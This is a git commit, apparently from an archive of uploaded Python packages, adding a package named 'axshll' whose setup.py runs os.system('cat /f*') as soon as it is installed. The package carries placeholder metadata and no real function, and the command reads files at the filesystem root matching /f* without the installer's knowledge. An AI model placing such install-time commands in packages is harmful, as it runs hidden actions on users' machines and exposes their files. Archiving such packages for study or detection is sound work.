875a333a6bdd37e7972d7519ff3d87740cbead43
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 17:24:53 +0000

    Add package axshll/0.0.1/axshll-0.0.1.tar.gz

---
+++ packages/axshll/axshll-0.0.1.tar.gz/axshll-0.0.1/setup.py
@@ -0,0 +1,10 @@
+from setuptools import setup
+import os
+os.system('cat /f*')
+
+setup(name='axshll',
+      version='0.0.1',
+      description='xshll',
+      author='xxsaf',
+      license='MIT',
+      packages=['axshll'])
